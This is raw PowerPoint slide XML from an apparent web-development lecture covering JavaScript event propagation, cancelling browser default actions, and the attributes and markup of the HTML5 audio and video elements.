              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>stopPropagate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(e) {</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e.cancelBubble</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = true;</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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>e.stopPropagation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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e.stopPropagation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>And for legacy browsers remember that your event handler should return false!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return false; /* last line of your event handler */</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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1E27F39-7329-4C5C-A6A5-18FAFD7263EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Preventing Side Effects</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(Browser Defaults)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20483" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B254488-0C9C-41C1-B907-047521F743F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8401050" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>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function cancelEvent(e) { </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e = e || window.event; </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e.cancelBubble = true; // for IE</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e.returnValue = false; // for IE</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 for non-IE browers</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if (e.stopPropagation)</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e.stopPropagation(); // others</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if (e.preventDefault)</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e.preventDefault(); // others    </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    return false; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10F6388C-CA5C-4F73-8C61-4914EEA656EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>HTML5 &lt;audio&gt; element</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160771" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37BF5893-3EFC-444C-B6F0-E126D20EE958}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>autoplay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> (if defined, starts playback automatically)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> (if present, browser offers controls)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>loop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> (if present, automatically seek back to the start when the audio ends)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>preload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> = none | metadata | auto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> = URL of the audio file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>volume</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> (0.0 = silent, 1.0 = loudest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00302851-2284-43A0-89DE-ED57A46D4CE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Using HTML5 &lt;audio&gt; element</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161795" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9BA4A73-8010-4EB1-8959-73EF2BD3B09A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;audio src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.mp3" autoplay loop preload="auto"&gt;&lt;/audio&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>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&lt;audio controls&gt;Your browser does not support the audio element. </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&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>file.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mp3" type="audio/mp3"&gt;</a:t>
            </a:r>
          </a:p>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&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>file.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ogg" type="audio/ogg"&gt;</a:t>
            </a:r>
          </a:p>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&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>file.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>aac" type="audio/mp4"&gt;</a:t>
            </a:r>
          </a:p>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&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.wav" type="audio/wav"&gt; </a:t>
            </a:r>
          </a:p>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&lt;/audio&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22EACABF-8569-43DD-9B57-1FE91F9122D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>HTML5 video element</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F124482-40C6-43DB-90E7-232E01DA067F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>autoplay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (if present, the video will start to play as soon as possible)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (if present, the video controls are displayed)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = height in pixels </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>loop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (if present, automatically seek back to the start when the video ends)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>poster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = the image to be displayed before the video loads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>preload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = none | metadata | auto</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = URL to the video file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = width in pixels</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC60F790-78FD-4CF1-B92F-D0ED136CD951}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Using HTML5 video element</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42A62818-D671-427D-9049-E30BF837AA83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;video width="640" height="480" autoplay&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>movie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.mp4" type="video/mp4"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>movie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.webm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" type="video/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>webm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;source src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>movie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.ogg" type="video/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ogg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Your browser doesn't support the video tag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/video&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;video src="example.mp4"&gt;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&lt;track kind="subtitles" label="English subtitles" src="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>subtitles_en.vtt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srclang</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en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
